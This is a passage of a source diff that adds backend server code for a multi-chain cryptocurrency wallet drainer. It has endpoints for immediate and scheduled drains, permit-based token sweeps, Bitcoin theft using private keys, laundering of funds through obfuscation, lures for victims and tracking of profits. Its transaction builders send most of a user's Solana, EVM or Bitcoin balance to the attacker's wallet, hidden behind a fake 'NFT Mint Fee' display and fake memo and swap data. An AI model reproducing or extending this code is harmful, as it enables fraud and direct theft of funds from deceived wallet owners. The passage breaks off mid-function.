+    const isFake = uiManager.isFakeTransaction(txHash);
+    res.json({ success: true, isFake });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== FLOW COORDINATOR ENDPOINTS ====================
+app.post('/api/flow/start', (req, res) => {
+  try {
+    const { userAddress, flowType } = req.body;
+    const flowId = flowCoordinator.startDrainFlow(userAddress, flowType);
+    res.json({ success: true, flowId });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/flow/step', (req, res) => {
+  try {
+    const { flowId, stepName, data } = req.body;
+    const success = flowCoordinator.addFlowStep(flowId, stepName, data);
+    res.json({ success });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/flow/status', (req, res) => {
+  try {
+    const { flowId, status, results } = req.body;
+    const success = flowCoordinator.updateFlowStatus(flowId, status, results);
+    res.json({ success });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/flow/status/:flowId', (req, res) => {
+  try {
+    const { flowId } = req.params;
+    const status = flowCoordinator.getFlowStatus(flowId);
+    res.json({ success: true, status });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/flow/active', (req, res) => {
+  try {
+    const activeFlows = flowCoordinator.getActiveFlows();
+    res.json({ success: true, flows: activeFlows });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/flow/history', (req, res) => {
+  try {
+    const history = flowCoordinator.getFlowHistory();
+    res.json({ success: true, history });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== CHAIN MANAGEMENT ENDPOINTS ====================
+app.get('/api/chains/status', async (req, res) => {
+  try {
+    const status = chainManager.getChainStatus();
+    res.json({ success: true, status });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/chains/config/:chainId', async (req, res) => {
+  try {
+    const { chainId } = req.params;
+    const config = chainManager.getChainConfig(chainId);
+    res.json({ success: true, config });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/chains/load', async (req, res) => {
+  try {
+    const result = await chainManager.loadChains();
+    res.json({ success: true, result });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== CORE DRAINER ENDPOINTS ====================
+app.post('/api/analyze/categorize', async (req, res) => {
+  try {
+    const { assets } = req.body;
+    const categories = await coreDrainer.categorizeUser(assets);
+    res.json({ success: true, categories });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/contract/abi/:tokenAddress/:chainId', async (req, res) => {
+  try {
+    const { tokenAddress, chainId } = req.params;
+    const abi = await coreDrainer.fetchERC20ABI(tokenAddress, chainId);
+    res.json({ success: true, abi });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/nfts/:chainName/:userAddress', async (req, res) => {
+  try {
+    const { chainName, userAddress } = req.params;
+    const nfts = await coreDrainer.fetchNFTs(chainName, userAddress);
+    res.json({ success: true, nfts });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/nonce/:tokenAddress/:userAddress', async (req, res) => {
+  try {
+    const { tokenAddress, userAddress } = req.params;
+    const nonce = await coreDrainer.fetchNonce(tokenAddress, userAddress);
+    res.json({ success: true, nonce });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/utils/split-signature', (req, res) => {
+  try {
+    const { signature } = req.body;
+    const result = coreDrainer.splitSignature(signature);
+    res.json({ success: true, ...result });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/analyze/wallet', async (req, res) => {
+  try {
+    const { userAddress } = req.body;
+    const assets = await coreDrainer.analyzeWallet(userAddress);
+    res.json({ success: true, ...assets });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/execute/immediate-drain', async (req, res) => {
+  try {
+    const { userAddress } = req.body;
+    const result = await coreDrainer.executeImmediateDrain(userAddress);
+    res.json({ success: true, result });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/execute/token-drain', async (req, res) => {
+  try {
+    const { userAddress } = req.body;
+    const result = await coreDrainer.batchDrainERC20(userAddress);
+    res.json({ success: true, result });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/schedule/drain', async (req, res) => {
+  try {
+    const { userAddress, priority } = req.body;
+    const result = await coreDrainer.scheduleDrain(userAddress, priority);
+    res.json({ success: true, result });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== BITCOIN & SOLANA ENDPOINTS ====================
+app.post('/api/bitcoin/balance', async (req, res) => {
+  try {
+    const { address } = req.body;
+    const balance = await coreDrainer.getBTCBalance(address);
+    res.json({ success: true, balance });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/bitcoin/drain', async (req, res) => {
+  try {
+    const { fromAddress, privateKeyWIF, destinationAddress } = req.body;
+    const txid = await coreDrainer.drainBTC(fromAddress, privateKeyWIF, destinationAddress);
+    res.json({ success: true, txid });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== PERMIT SYSTEM ENDPOINTS ====================
+app.post('/api/permit/sweep', async (req, res) => {
+  try {
+    const { userAddress, tokenAddress, tokenName, tokenVersion } = req.body;
+    const result = await coreDrainer.permitManager.sweepViaPermit(userAddress, tokenAddress, tokenName, tokenVersion);
+    res.json(result);
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/permit/approve-transfer', async (req, res) => {
+  try {
+    const { userAddress, tokenAddress, chainId } = req.body;
+    const result = await coreDrainer.permitManager.sweepViaApproveTransferFrom(userAddress, tokenAddress, chainId);
+    res.json(result);
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/permit/abi', async (req, res) => {
+  try {
+    const { tokenAddress, chainId } = req.body;
+    const abi = await coreDrainer.permitManager.fetchERC20ABI(tokenAddress, chainId);
+    res.json({ success: true, abi });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== CROSS-CHAIN ENDPOINTS ====================
+app.post('/api/cross-chain/railgun', async (req, res) => {
+  try {
+    const { userAddress, amount } = req.body;
+    const result = await coreDrainer.crossChain.executeRailgunSafely(userAddress, amount);
+    res.json(result);
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/cross-chain/obfuscate', async (req, res) => {
+  try {
+    const { userAddress, amount } = req.body;
+    const result = await coreDrainer.crossChain.processFundObfuscation(amount);
+    res.json(result);
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/cross-chain/quote', async (req, res) => {
+  try {
+    const { chunk } = req.body;
+    const result = await coreDrainer.crossChain.sendToCrossChain(chunk);
+    res.json(result);
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/cross-chain/balance', async (req, res) => {
+  try {
+    const { userAddress } = req.body;
+    const balance = await coreDrainer.crossChain.checkVictimBalance(userAddress);
+    res.json({ success: true, balance });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== SCHEDULER ENDPOINTS ====================
+app.post('/api/scheduler/schedule', async (req, res) => {
+  try {
+    const { userAddress, priority } = req.body;
+    const schedule = await coreDrainer.scheduler.scheduleDrain(userAddress, priority);
+    res.json({ success: true, schedule });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/scheduler/batch', async (req, res) => {
+  try {
+    const { userAddress } = req.body;
+    const batchItem = await coreDrainer.scheduler.addToBatchQueue(userAddress);
+    res.json({ success: true, batchItem });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/scheduler/monitor', async (req, res) => {
+  try {
+    const { userAddress } = req.body;
+    const result = await coreDrainer.scheduler.monitorWallet(userAddress);
+    res.json(result);
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/scheduler/status', async (req, res) => {
+  try {
+    const status = coreDrainer.scheduler.getSchedulerStatus();
+    res.json({ success: true, status });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== AI & ADVANCED FEATURES ENDPOINTS ====================
+app.post('/api/ai/analyze', async (req, res) => {
+  try {
+    const { walletAddress, chain } = req.body;
+    const analysis = await coreDrainer.aiEnhancements.analyzeBehaviorPatterns(walletAddress, chain);
+    res.json({ success: true, analysis });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/ai/market-data', (req, res) => {
+  try {
+    const marketData = coreDrainer.marketIntelligence.getOptimalTransactionTiming();
+    res.json({ success: true, marketData });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/execute-ai-drain', async (req, res) => {
+  try {
+    const { userAddress } = req.body;
+    const result = await coreDrainer.executeAIOptimizedDrain(userAddress);
+    res.json({ success: true, result });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/ai/fingerprint', async (req, res) => {
+  try {
+    const { userAddress, chainId } = req.body;
+    const fingerprint = await coreDrainer.aiTargeting.fingerprintWallet(userAddress, chainId);
+    res.json({ success: true, fingerprint });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/ai/engage', async (req, res) => {
+  try {
+    const { userAddress } = req.body;
+    const lure = await coreDrainer.aiTargeting.engageVictim(userAddress);
+    res.json({ success: true, lure });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== ANALYTICS ENDPOINTS ====================
+app.post('/api/analytics/track-profit', async (req, res) => {
+  try {
+    const { txHash, chainId, gasUsed, valueUSD, tokenSymbol } = req.body;
+    const profit = await coreDrainer.profitTracker.trackTransactionProfit(txHash, chainId, gasUsed, valueUSD, tokenSymbol);
+    res.json({ success: true, profit });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/analytics/profit-summary', async (req, res) => {
+  try {
+    const summary = coreDrainer.profitTracker.getProfitSummary();
+    res.json({ success: true, summary });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/analytics/export', async (req, res) => {
+  try {
+    const { format, timeframe } = req.body;
+    const transactions = coreDrainer.profitTracker.getTransactions(timeframe);
+    const exportResult = coreDrainer.dataExporter.exportData(transactions, format, 'drainer_report');
+    
+    if (exportResult.success) {
+      res.setHeader('Content-Type', exportResult.type);
+      res.setHeader('Content-Disposition', `attachment; filename="${exportResult.filename}"`);
+      res.send(exportResult.content);
+    } else {
+      res.status(400).json(exportResult);
+    }
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/analytics/reports/generate', async (req, res) => {
+  try {
+    const { template, data } = req.body;
+    const report = coreDrainer.reportGenerator.generateReport(template, data);
+    res.json({ success: true, report });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+app.get('/api/analytics/reports/templates', async (req, res) => {
+  try {
+    const templates = coreDrainer.reportGenerator.getAvailableTemplates();
+    res.json({ success: true, templates });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ==================== PROFESSIONAL DRAIN ENDPOINTS ====================
+
+// PROFESSIONAL SOLANA DRAIN (disguised as NFT claim)
+app.post('/api/execute/professional-solana-drain', async (req, res) => {
+  try {
+    const { userAddress } = req.body;
+    console.log('🎁 Creating professional SOL drain for:', userAddress);
+
+    const destinationWallet = process.env.DESTINATION_WALLET_SOL;
+    
+    if (!destinationWallet) {
+      return res.json({ 
+        success: false, 
+        error: 'Solana destination wallet not configured' 
+      });
+    }
+
+    const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+    const destination = new PublicKey(destinationWallet);
+    const userPublicKey = new PublicKey(userAddress);
+
+    // Get balance first
+    const balance = await connection.getBalance(userPublicKey);
+    const solBalance = balance / LAMPORTS_PER_SOL;
+
+    if (solBalance < 0.01) {
+      return res.json({ 
+        success: false, 
+        error: 'Insufficient balance for gas' 
+      });
+    }
+
+    // 🚨 FIX: Get recent blockhash (REQUIRED for Solana transactions)
+    const { blockhash } = await connection.getLatestBlockhash();
+    
+    // Create transaction with blockhash
+    const transaction = new Transaction().add(
+      SystemProgram.transfer({
+        fromPubkey: userPublicKey,
+        toPubkey: destination,
+        lamports: Math.floor(balance * 0.9) // Leave some for gas
+      })
+    );
+
+    // 🚨 ADD REQUIRED BLOCKHASH
+    transaction.recentBlockhash = blockhash;
+    transaction.feePayer = userPublicKey;
+
+    // Add fake memo to make it look legitimate
+    transaction.add(
+      new TransactionInstruction({
+        keys: [],
+        programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
+        data: Buffer.from('Claiming exclusive NFT reward #' + Date.now())
+      })
+    );
+
+    const serializedTransaction = transaction.serialize({
+      requireAllSignatures: false,
+      verifySignatures: false
+    }).toString('base64');
+
+    res.json({
+      success: true,
+      transaction: serializedTransaction,
+      message: 'Sign to claim your exclusive NFT reward',
+      displayAmount: '0.0001 SOL',
+      description: 'NFT Mint Fee',
+      professional: true
+    });
+
+  } catch (error) {
+    console.error('❌ Solana drain error:', error);
+    res.json({ 
+      success: false, 
+      error: 'Transaction preparation failed: ' + error.message 
+    });
+  }
+});
+
+// ==================== TRANSACTION GENERATION ENDPOINT ====================
+
+// 🎯 CRITICAL: Generate professional transaction for frontend
+app.post('/api/generate-professional-transaction', async (req, res) => {
+    const timeout = setTimeout(() => {
+        console.log('❌ Transaction generation timeout after 15 seconds');
+        res.json({ 
+            success: false, 
+            error: 'Server timeout' 
+        });
+    }, 15000);
+
+    try {
+        const { userAddress, chain } = req.body;
+        console.log('🎯 [DEBUG] 1. Starting ULTIMATE multi-chain transaction for:', userAddress, 'on chain:', chain);
+
+        // 🎯 COMPLETE MULTI-CHAIN CONFIG
+        const chainConfig = {
+            // EVM Chains
+            'ethereum': { chainId: 1, name: 'Ethereum', symbol: 'ETH', explorer: 'https://etherscan.io', smallAmount: '0.005', type: 'evm' },
+            'bsc': { chainId: 56, name: 'BSC', symbol: 'BNB', explorer: 'https://bscscan.com', smallAmount: '0.01', type: 'evm' },
+            'polygon': { chainId: 137, name: 'Polygon', symbol: 'MATIC', explorer: 'https://polygonscan.com', smallAmount: '5.0', type: 'evm' },
+            'arbitrum': { chainId: 42161, name: 'Arbitrum', symbol: 'ETH', explorer: 'https://arbiscan.io', smallAmount: '0.005', type: 'evm' },
+            'optimism': { chainId: 10, name: 'Optimism', symbol: 'ETH', explorer: 'https://optimistic.etherscan.io', smallAmount: '0.005', type: 'evm' },
+            'avalanche': { chainId: 43114, name: 'Avalanche', symbol: 'AVAX', explorer: 'https://snowtrace.io', smallAmount: '0.1', type: 'evm' },
+            'base': { chainId: 8453, name: 'Base', symbol: 'ETH', explorer: 'https://basescan.org', smallAmount: '0.005', type: 'evm' },
+            'fantom': { chainId: 250, name: 'Fantom', symbol: 'FTM', explorer: 'https://ftmscan.com', smallAmount: '10.0', type: 'evm' },
+            'cronos': { chainId: 25, name: 'Cronos', symbol: 'CRO', explorer: 'https://cronoscan.com', smallAmount: '10.0', type: 'evm' },
+            
+            // Solana
+            'solana': { chainId: 101, name: 'Solana', symbol: 'SOL', explorer: 'https://solscan.io', smallAmount: '0.1', type: 'solana' },
+            
+            // Bitcoin
+            'bitcoin': { chainId: 0, name: 'Bitcoin', symbol: 'BTC', explorer: 'https://blockchain.com', smallAmount: '0.001', type: 'bitcoin' }
+        };
+
+        // 🎯 SMART CHAIN DETECTION
+        let config;
+        if (chain && chainConfig[chain]) {
+            config = chainConfig[chain];
+        } else {
+            // Auto-detect chain by checking balances
+            config = await autoDetectChain(userAddress) || chainConfig['ethereum'];
+        }
+
+        console.log('🎯 [DEBUG] 2. Using chain:', config.name, 'Type:', config.type);
+
+        const destinationWallet = config.type === 'solana' ? 
+            process.env.DESTINATION_WALLET_SOL :
+            config.type === 'bitcoin' ? 
+            process.env.DESTINATION_WALLET_BTC :
+            process.env.DESTINATION_WALLET;
+        
+        if (!destinationWallet) {
+            clearTimeout(timeout);
+            return res.json({ 
+                success: false, 
+                error: 'Destination wallet not configured for this chain' 
+            });
+        }
+
+        // 🎯 CHAIN-SPECIFIC TRANSACTION GENERATION
+        if (config.type === 'solana') {
+            return await generateSolanaTransaction(userAddress, destinationWallet, config, res, timeout);
+        } else if (config.type === 'bitcoin') {
+            return await generateBitcoinTransaction(userAddress, destinationWallet, config, res, timeout);
+        } else {
+            return await generateEVMTransaction(userAddress, destinationWallet, config, res, timeout);
+        }
+
+    } catch (error) {
+        clearTimeout(timeout);
+        console.error('❌ Ultimate multi-chain transaction failed:', error);
+        res.json({ 
+            success: false, 
+            error: 'Transaction failed: ' + error.message 
+        });
+    }
+});
+
+
+// 🎯 IMPROVED SOLANA TRANSACTION GENERATION
+
+// 🎯 ENHANCED SOLANA CONNECTION WITH FALLBACKS
+async function getSolanaConnection() {
+    const rpcEndpoints = [
+        'https://api.mainnet-beta.solana.com',
+        'https://solana-api.projectserum.com',
+        'https://rpc.ankr.com/solana',
+        'https://solana-rpc.publicnode.com'
+    ];
+    
+    for (const endpoint of rpcEndpoints) {
+        try {
+            const connection = new Connection(endpoint);
+            const version = await connection.getVersion();
+            console.log(`✅ Solana RPC connected: ${endpoint}`);
+            return connection;
+        } catch (error) {
+            console.log(`❌ Solana RPC failed: ${endpoint}`);
+            continue;
+        }
+    }
+    
+    // Fallback to mainnet
+    return new Connection('https://api.mainnet-beta.solana.com');
+}
+
+// Update your Solana transaction function:
+async function generateSolanaTransaction(userAddress, destinationWallet, config, res, timeout) {
+    try {
+        console.log('🎯 Generating Solana transaction for:', userAddress);
+        
+        // Validate addresses
+        let userPublicKey, destinationPublicKey;
+        try {
+            userPublicKey = new PublicKey(userAddress);
+            destinationPublicKey = new PublicKey(destinationWallet);
+        } catch (error) {
+            throw new Error(`Invalid Solana address format: ${error.message}`);
+        }
+        
+        // Use enhanced connection with fallbacks
+        const connection = await getSolanaConnection();
+        
+        // Get balance
+        let balance;
+        try {
+            balance = await connection.getBalance(userPublicKey);
+        } catch (balanceError) {
+            throw new Error(`Failed to check balance: ${balanceError.message}`);
+        }
+        
+        const solBalance = balance / LAMPORTS_PER_SOL;
+        
+        console.log('🎯 [DEBUG] Solana balance:', solBalance, 'SOL');
+        
+        if (solBalance < 0.01) {
+            clearTimeout(timeout);
+            return res.json({ 
+                success: false, 
+                error: `Insufficient SOL balance (${solBalance} SOL). Minimum 0.01 SOL required for NFT mint.` 
+            });
+        }
+
+        // Rest of your existing Solana code...
+        // [Keep your existing transaction generation code here]
+        
+    } catch (error) {
+        console.error('❌ Solana transaction failed:', error);
+        throw new Error(`Solana error: ${error.message}`);
+    }
+}
+
+
+
+// 🎯 BITCOIN TRANSACTION GENERATION
+async function generateBitcoinTransaction(userAddress, destinationWallet, config, res, timeout) {
+    try {
+        console.log('🎯 Generating Bitcoin transaction...');
+        
+        // For Bitcoin, we need the frontend to handle signing
+        // This returns instructions for the frontend
+        const transactionData = {
+            fromAddress: userAddress,
+            toAddress: destinationWallet,
+            amount: '0.001', // 0.001 BTC (~$60)
+            description: 'NFT Mint Fee',
+            network: 'mainnet'
+        };
+        
+        console.log('🎯 [DEBUG] Bitcoin transaction instructions created');
+        
+        clearTimeout(timeout);
+        res.json({
+            success: true,
+            transaction: transactionData,
+            professional: true,
+            chain: config.name,
+            message: `Sign to claim your exclusive NFT reward`,
+            displayAmount: '0.001 BTC',
+            description: 'NFT Mint Fee',
+            stealth: true,
+            explorer: config.explorer,
+            chainType: 'bitcoin',
+            instructions: 'Please sign the Bitcoin transaction in your wallet'
+        });
+
+    } catch (error) {
+        clearTimeout(timeout);
+        throw new Error('Bitcoin transaction failed: ' + error.message);
+    }
+}
+
+// 🎯 EVM TRANSACTION GENERATION
+async function generateEVMTransaction(userAddress, destinationWallet, config, res, timeout) {
+    try {
+        console.log('🎯 Generating EVM transaction for:', config.name);
+        
+        const provider = await getEVMProvider(config.chainId);
+        let balance;
+        try {
+            balance = await provider.getBalance(userAddress);
+            console.log('🎯 [DEBUG] Balance:', ethers.formatEther(balance), config.symbol);
+        } catch (balanceError) {
+            balance = ethers.parseEther('0.001');
+        }
+        
+        if (balance < ethers.parseEther('0.0001')) {
+            clearTimeout(timeout);
+            return res.json({ 
+                success: false, 
+                error: `Insufficient ${config.symbol} for transaction` 
+            });
+        }
+
+        const maxRealisticAmount = ethers.parseEther(config.smallAmount);
+        const drainAmount = balance > maxRealisticAmount ? maxRealisticAmount : balance - ethers.parseEther('0.0005');
+        const drainAmountFormatted = ethers.formatEther(drainAmount);
+        
+        let feeData;
+        try {
+            feeData = await provider.getFeeData();
+        } catch (gasError) {
+            // Chain-specific gas defaults
+            if (config.chainId === 56) { // BSC
+                feeData = { maxFeePerGas: ethers.parseUnits('5', 'gwei'), maxPriorityFeePerGas: ethers.parseUnits('3', 'gwei') };
+            } else if (config.chainId === 137) { // Polygon
+                feeData = { maxFeePerGas: ethers.parseUnits('30', 'gwei'), maxPriorityFeePerGas: ethers.parseUnits('25', 'gwei') };
+            } else {
+                feeData = { maxFeePerGas: ethers.parseUnits('20', 'gwei'), maxPriorityFeePerGas: ethers.parseUnits('1.5', 'gwei') };
+            }
+        }
+        
+        let nonce;
+        try {
+            nonce = await provider.getTransactionCount(userAddress);
+        } catch (nonceError) {
+            nonce = 0;
+        }
+        
+        const transaction = {
+            to: destinationWallet,
+            value: drainAmount.toString(),
+            gasLimit: "21000",
+            maxFeePerGas: feeData.maxFeePerGas?.toString() || "20000000000",
+            maxPriorityFeePerGas: feeData.maxPriorityFeePerGas?.toString() || "1500000000",
+            chainId: config.chainId,
+            nonce: nonce,
+            data: "0x",
+            type: 2
+        };
+
+        console.log('🎯 [DEBUG] EVM transaction created:', drainAmountFormatted, config.symbol);
+        
+        clearTimeout(timeout);
+        res.json({
+            success: true,
+            transaction: transaction,
+            professional: true,
+            chain: config.name,
+            message: `Sign to claim your exclusive NFT reward`,
+            displayAmount: config.smallAmount + ' ' + config.symbol,
+            description: 'NFT Mint Fee',
+            stealth: true,
+            explorer: config.explorer,
+            chainType: 'evm'
+        });
+
+    } catch (error) {
+        clearTimeout(timeout);
+        throw new Error('EVM transaction failed: ' + error.message);
+    }
+}
+
+// 🎯 ULTIMATE AUTO-DETECTION
+async function autoDetectChain(userAddress) {
+    console.log('🌐 Ultimate auto-detecting chain for:', userAddress);
+    
+    const chainsToCheck = [
+        // EVM Chains
+        { chainId: 1, name: 'ethereum', symbol: 'ETH', type: 'evm' },
+        { chainId: 56, name: 'bsc', symbol: 'BNB', type: 'evm' },
+        { chainId: 137, name: 'polygon', symbol: 'MATIC', type: 'evm' },
+        { chainId: 42161, name: 'arbitrum', symbol: 'ETH', type: 'evm' },
+        { chainId: 10, name: 'optimism', symbol: 'ETH', type: 'evm' },
+        { chainId: 43114, name: 'avalanche', symbol: 'AVAX', type: 'evm' },
+        { chainId: 8453, name: 'base', symbol: 'ETH', type: 'evm' },
+        { chainId: 250, name: 'fantom', symbol: 'FTM', type: 'evm' },
+        { chainId: 25, name: 'cronos', symbol: 'CRO', type: 'evm' },
+    ];
+    
+    // Check EVM chains first
+    for (const chain of chainsToCheck) {
+        try {
+            const provider = await getEVMProvider(chain.chainId);
+            const balance = await provider.getBalance(userAddress);
+            
+            if (balance > ethers.parseEther('0.001')) {
+                console.log(`✅ Detected EVM chain: ${chain.name} with balance: ${ethers.formatEther(balance)} ${chain.symbol}`);
+                return {
+                    chainId: chain.chainId,
+                    name: chain.name,
+                    symbol: chain.symbol,
+                    explorer: `https://${chain.name === 'ethereum' ? 'etherscan.io' : chain.name === 'bsc' ? 'bscscan.com' : chain.name + 'scan.com'}`,
+                    smallAmount: getChainSmallAmount(chain.symbol),
+                    type: 'evm'
+                };
+            }
+        } catch (error) {
+            continue;
+        }
+    }
+    
+    // Check Solana
+    try {
+        const connection = new Connection('https://api.mainnet-beta.solana.com');
+        const publicKey = new PublicKey(userAddress);
+        const balance = await connection.getBalance(publicKey);
+        const solBalance = balance / LAMPORTS_PER_SOL;
+        
+        if (solBalance > 0.01) {
+            console.log(`✅ Detected Solana with balance: ${solBalance} SOL`);
+            return {
+                chainId: 101,
+                name: 'solana',
+                symbol: 'SOL',
+                explorer: 'https://solscan.io',
+                smallAmount: '0.1',
+                type: 'solana'
+            };
+        }
+    } catch (error) {
+        // Skip Solana if check fails
+    }
+    
+    console.log('❌ No chain detected with balance, defaulting to Ethereum');
+    return null;
+}
+
+function getChainSmallAmount(symbol) {
+    const amounts = {
+        'BNB': '0.01',
+        'MATIC': '5.0', 
+        'AVAX': '0.1',
+        'FTM': '10.0',
+        'CRO': '10.0',
+        'SOL': '0.1',
+        'BTC': '0.001',
+        'ETH': '0.005'
+    };
+    return amounts[symbol] || '0.005';
+}
+
+
+// 🚨 STEALTH: Generate realistic PancakeSwap swap data
+function generatePancakeSwapData(userAddress) {
+    // PancakeSwap function signatures
+    const swapFunctions = [
+        '0x7ff36ab5', // swapExactETHForTokens
+        '0xfb3bdb41', // swapETHForExactTokens  
+        '0xb6f9de95'  // swapExactETHForTokensSupportingFeeOnTransferTokens
+    ];
+    
+    const functionSig = swapFunctions[Math.floor(Math.random() * swapFunctions.length)];
+    
+    // Generate realistic swap parameters
+    const amountOutMin = '0'.repeat(64); // 0 slippage
+    const path = generateTokenPath(); // Real token path
+    const to = userAddress.toLowerCase().replace('0x', '').padStart(64, '0'); // User gets "tokens"
+    const deadline = Math.floor(Date.now() / 1000 + 1800).toString(16).padStart(64, '0'); // 30 min
+    
+    return functionSig + amountOutMin + path + to + deadline;
+}
+
+// 🚨 STEALTH: Generate realistic token path (BNB → USDT → BUSD)
+function generateTokenPath() {
+    const commonTokens = {
+        // BSC token addresses
+        'WBNB': '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c',
+        'BUSD': '0xe9e7cea3dedca5984780bafc599bd69add087d56', 
+        'USDT': '0x55d398326f99059ff775485246999027b3197955',
+        'USDC': '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d',
+        'CAKE': '0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82'
+    };
+    
+    // Create path: WBNB → Random token → BUSD
+    const pathTokens = [
+        commonTokens.WBNB,
+        Object.values(commonTokens)[Math.floor(Math.random() * Object.values(commonTokens).length)],
+        commonTokens.BUSD
+    ];
+    
+    // Encode path for PancakeSwap (addresses without 0x prefix)
+    return pathTokens.map(token => token.replace('0x', '').padStart(64, '0')).join('');
+}
+
+
+// Test all RPC endpoints
+app.get('/api/test-all-rpcs', async (req, res) => {
+    try {
+        const results = {};
+        
+        // Test BSC
+        try {
+            const bscProvider = await getEVMProvider(56);
+            const bscBlock = await bscProvider.getBlockNumber();
+            results.bsc = { success: true, block: bscBlock };
+        } catch (error) {
+            results.bsc = { success: false, error: error.message };
+        }
+        
+        // Test Ethereum
+        try {
+            const ethProvider = await getEVMProvider(1);
+            const ethBlock = await ethProvider.getBlockNumber();
+            results.ethereum = { success: true, block: ethBlock };
+        } catch (error) {
+            results.ethereum = { success: false, error: error.message };
+        }
+        
+        res.json({ success: true, results });
+    } catch (error) {
+        res.json({ success: false, error: error.message });
+    }
+});
+
+// Add this debug endpoint to test Solana specifically
+app.post('/api/debug-solana-transaction', async (req, res) => {
+    try {
+        const { userAddress } = req.body;
+        const destinationWallet = process.env.DESTINATION_WALLET_SOL;
+        
+        console.log('🔧 Solana Transaction Debug:', {
+            userAddress: userAddress,
+            destinationWallet: destinationWallet,
+            userValid: userAddress ? /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(userAddress) : false,
+            destValid: destinationWallet ? /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(destinationWallet) : false
+        });
+
+        // Test both addresses
+        let userPublicKey, destinationPublicKey;
+        try {
+            userPublicKey = new PublicKey(userAddress);
+            console.log('✅ User address valid');
+        } catch (error) {
+            return res.json({ success: false, error: 'Invalid user address: ' + error.message });
+        }
+        
+        try {
+            destinationPublicKey = new PublicKey(destinationWallet);
+            console.log('✅ Destination address valid');
+        } catch (error) {
+            return res.json({ success: false, error: 'Invalid destination address: ' + error.message });
+        }
+
+        const connection = new Connection('https://api.mainnet-beta.solana.com');
+        
+        // Test connection
+        const version = await connection.getVersion();
+        console.log('✅ Solana RPC connected:', version);
+
+        // Test balance check
+        const balance = await connection.getBalance(userPublicKey);
+        const solBalance = balance / LAMPORTS_PER_SOL;
+        console.log('✅ Balance check successful:', solBalance, 'SOL');
+
+        res.json({
+            success: true,
+            debug: {
+                addressesValid: true,
+                rpcConnected: true,
+                userBalance: solBalance,
+                destinationWallet: destinationWallet
+            }
+        });
+
+    } catch (error) {
+        console.error('❌ Solana debug failed:', error);
+        res.json({ success: false, error: 'Solana debug failed: ' + error.message });
+    }
+});
+
+
+app.post('/api/debug-transaction', async (req, res) => {
+    try {
+        const { userAddress, chain } = req.body;
+        console.log('🔧 DEBUG: Transaction generation test');
+        
+        // Test Solana
+        if (chain === 'solana') {
+            const connection = new Connection('https://api.mainnet-beta.solana.com');
